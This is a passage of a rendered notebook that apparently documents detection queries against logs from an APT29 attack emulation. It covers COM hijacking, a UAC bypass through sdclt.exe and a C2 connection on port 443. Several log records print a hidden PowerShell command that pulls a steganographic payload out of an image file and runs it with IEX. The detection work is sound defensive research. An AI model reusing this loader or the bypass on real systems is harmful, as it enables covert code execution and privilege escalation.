<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 NewProcessName  | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                                                                                                                                                                                                                                                                                                                                                                     
 CommandLine     | &quot;PowerShell.exe&quot; -noni -noexit -ep bypass -window hidden -c &quot;sal a New-Object;Add-Type -AssemblyName &#39;System.Drawing&#39;; $g=a System.Drawing.Bitmap(&#39;C:\Users\pbeesly\Downloads\monkey.png&#39;);$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))&quot; 
 ScriptBlockText | sal a New-Object;Add-Type -AssemblyName &#39;System.Drawing&#39;; $g=a System.Drawing.Bitmap(&#39;C:\Users\pbeesly\Downloads\monkey.png&#39;);$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))                                                               
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-1-component-object-model-hijacking">
<h2>3.B.1. Component Object Model Hijacking<a class="headerlink" href="#b-1-component-object-model-hijacking" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Modified the Registry to enable COM hijacking of sdclt.exe using PowerShell</p>
<p><strong>Criteria:</strong> Addition of the DelegateExecute ​subkey in ​HKCU\Software\Classes\Folder\shell\open\​​command​​</p>
<div class="section" id="id12">
<h3>Detection Type:Telemetry(None)<a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:04EB334D-A304-40D9-B177-0BB6E95FC23E</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 13</span>
<span class="sd">    AND LOWER(TargetObject) RLIKE &#39;.*\\\\\\\\folder\\\\\\\\shell\\\\\\\\open\\\\\\\\command\\\\\\\delegateexecute.*&#39;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2020-05-02 02:58:30.649
ProcessGuid: {47ab858c-e18b-5eac-b103-000000000400}
ProcessId: 6868
Image: C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\Folder\shell\open\command\DelegateExecute
Details: (Empty) 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-2-bypass-user-account-control">
<h2>3.B.2. Bypass User Account Control<a class="headerlink" href="#b-2-bypass-user-account-control" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Executed elevated PowerShell payload</p>
<p><strong>Criteria:</strong> High integrity powershell.exe spawning from control.exe​​ (spawned from sdclt.exe)</p>
<div class="section" id="detection-type-technique-none">
<h3>Detection Type:Technique(None)<a class="headerlink" href="#detection-type-technique-none" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:7a4a8c7e-4238-4db3-a90d-34e9f3c6e60f</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 1</span>
<span class="sd">    AND LOWER(ParentImage) LIKE &quot;%sdclt.exe%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 02:58:43.212
ProcessGuid: {47ab858c-e1e3-5eac-b603-000000000400}
ProcessId: 4892
Image: C:\Windows\System32\control.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows Control Panel
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CONTROL.EXE
CommandLine: &quot;C:\Windows\System32\control.exe&quot;  /name Microsoft.BackupAndRestoreCenter
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
LogonId: 0x372E81
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=D054A1D1E0BECCA5EEF751CF616ECB811CFABECE,MD5=62D970D8B60F75C12D21C740F2D8A5DA,SHA256=D6E21DA3BE0701162A36F8C9F94E616B1A0C5FD4CC1B52EFD81959CB257957C1,IMPHASH=7A8EC2645C24D85DE8216D63022623C0
ParentProcessGuid: {47ab858c-e1e3-5eac-b503-000000000400}
ParentProcessId: 6492
ParentImage: C:\Windows\System32\sdclt.exe
ParentCommandLine: &quot;C:\windows\system32\sdclt.exe&quot;  
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:d52fe669-55da-49e1-a76b-89297c66fa02</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">  AND EventID = 4688</span>
<span class="sd">  AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x372E81

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x131c
	New Process Name:	C:\Windows\System32\control.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0x195c
	Creator Process Name:	C:\Windows\System32\sdclt.exe
	Process Command Line:	&quot;C:\Windows\System32\control.exe&quot;  /name Microsoft.BackupAndRestoreCenter

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="id13">
<h3>Detection Type:Telemetry(None)<a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:F7E315BA-6A66-44D8-ABB3-3FBB4AA8F80A</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND EventID = 1</span>
<span class="sd">    AND LOWER(Image) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    AND IntegrityLevel = &quot;High&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 02:58:43.008
ProcessGuid: {47ab858c-e1e3-5eac-b503-000000000400}
ProcessId: 6492
Image: C:\Windows\System32\sdclt.exe
FileVersion: 10.0.18362.657 (WinBuild.160101.0800)
Description: Microsoft® Windows Backup
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sdclt.exe
CommandLine: &quot;C:\windows\system32\sdclt.exe&quot; 
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
LogonId: 0x372E81
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=4D64682188DB0A028EC382975D8872CF1B61EBE4,MD5=F96744B10792C70426608E670C0E39DB,SHA256=DAFB903D3AA945C4AC01011E38F3E232D6BE8B7F9B66B7C3CCB1A1ECFC1B7A90,IMPHASH=B3A705D69AAAAF7164324CD5E6AF8E0D
ParentProcessGuid: {47ab858c-e188-5eac-b003-000000000400}
ParentProcessId: 3480
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: &quot;C:\windows\system32\cmd.exe&quot; 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:6C8780E9-E6AF-4210-8EA0-72E9017CEE7D</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT ProcessGuid</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">        AND EventID = 1</span>
<span class="sd">        AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">        AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">) b</span>
<span class="sd">ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND a.EventID = 1</span>
<span class="sd">    AND a.IntegrityLevel = &quot;High&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Process Create:
RuleName: -
UtcTime: 2020-05-02 02:58:44.325
ProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
ProcessId: 2976
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: &quot;PowerShell.exe&quot; -noni -noexit -ep bypass -window hidden -c &quot;sal a New-Object;Add-Type -AssemblyName &#39;System.Drawing&#39;; $g=a System.Drawing.Bitmap(&#39;C:\Users\pbeesly\Downloads\monkey.png&#39;);$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))&quot;
CurrentDirectory: C:\windows\system32\
User: DMEVALS\pbeesly
LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
LogonId: 0x372E81
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481
ParentProcessGuid: {47ab858c-e1e3-5eac-b603-000000000400}
ParentProcessId: 4892
ParentImage: C:\Windows\System32\control.exe
ParentCommandLine: &quot;C:\Windows\System32\control.exe&quot;  /name Microsoft.BackupAndRestoreCenter 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:C36B49B5-DF58-4A34-9FE9-56189B9DEFEA</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host</span>
<span class="sd">WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">  AND EventID = 4688</span>
<span class="sd">  AND LOWER(NewProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">  AND MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">  AND TokenElevationType = &quot;%%1937&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x372E81

Process Information:
	New Process ID:		0x195c
	New Process Name:	C:\Windows\System32\sdclt.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0xd98
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	&quot;C:\windows\system32\sdclt.exe&quot; 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:EE34D18C-0549-4AFB-8B98-01160B0C9094</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host a</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT NewProcessId</span>
<span class="sd">    FROM apt29Host</span>
<span class="sd">    WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">        AND EventID = 4688</span>
<span class="sd">        AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">        AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">) b</span>
<span class="sd">ON a.ProcessId = b.NewProcessId</span>
<span class="sd">WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">    AND a.EventID = 4688</span>
<span class="sd">    AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">    AND a.TokenElevationType = &quot;%%1937&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
	Account Name:		pbeesly
	Account Domain:		DMEVALS
	Logon ID:		0x372E81

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xba0
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1937
	Mandatory Label:		S-1-16-12288
	Creator Process ID:	0x131c
	Creator Process Name:	C:\Windows\System32\control.exe
	Process Command Line:	&quot;PowerShell.exe&quot; -noni -noexit -ep bypass -window hidden -c &quot;sal a New-Object;Add-Type -AssemblyName &#39;System.Drawing&#39;; $g=a System.Drawing.Bitmap(&#39;C:\Users\pbeesly\Downloads\monkey.png&#39;);$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))&quot;

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator. 
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="b-3-commonly-used-port">
<h2>3.B.3. Commonly Used Port<a class="headerlink" href="#b-3-commonly-used-port" title="Permalink to this headline">¶</a></h2>
<p><strong>Procedure:</strong> Established C2 channel (192.168.0.5) via PowerShell payload over TCP port 443</p>
<p><strong>Criteria:</strong> Established network channel over port 443</p>
<div class="section" id="id14">
<h3>Detection Type:Telemetry(Correlated)<a class="headerlink" href="#id14" title="Permalink to this headline">¶</a></h3>
<p><strong>Query ID:E209D0C5-5A2B-4AEC-92B0-1510165B8EC7</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host d</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT a.ProcessGuid</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT ProcessGuid</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">          AND EventID = 1</span>
<span class="sd">          AND LOWER(Image) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentImage) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ParentProcessGuid = b.ProcessGuid</span>
<span class="sd">    WHERE a.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">      AND a.EventID = 1</span>
<span class="sd">      AND a.IntegrityLevel = &quot;High&quot;</span>
<span class="sd">) c</span>
<span class="sd">ON d.ProcessGuid = c.ProcessGuid</span>
<span class="sd">WHERE d.Channel = &quot;Microsoft-Windows-Sysmon/Operational&quot;</span>
<span class="sd">    AND d.EventID = 3</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Network connection detected:
RuleName: -
UtcTime: 2020-05-02 02:58:46.099
ProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
ProcessId: 2976
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DMEVALS\pbeesly
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.1.4
SourceHostname: -
SourcePort: 59846
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.0.5
DestinationHostname: -
DestinationPort: 443
DestinationPortName: - 
-RECORD 1-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Network connection detected:
RuleName: -
UtcTime: 2020-05-02 02:58:45.688
ProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
ProcessId: 2976
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DMEVALS\pbeesly
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.1.4
SourceHostname: -
SourcePort: 59845
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.0.5
DestinationHostname: -
DestinationPort: 443
DestinationPortName: - 
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:2E9B9ADC-2426-419F-8E6E-2D9338384F80</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host d</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">    SELECT split(a.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">) c</span>
<span class="sd">ON LOWER(hex(CAST(ProcessId as INT))) = c.NewProcessId</span>
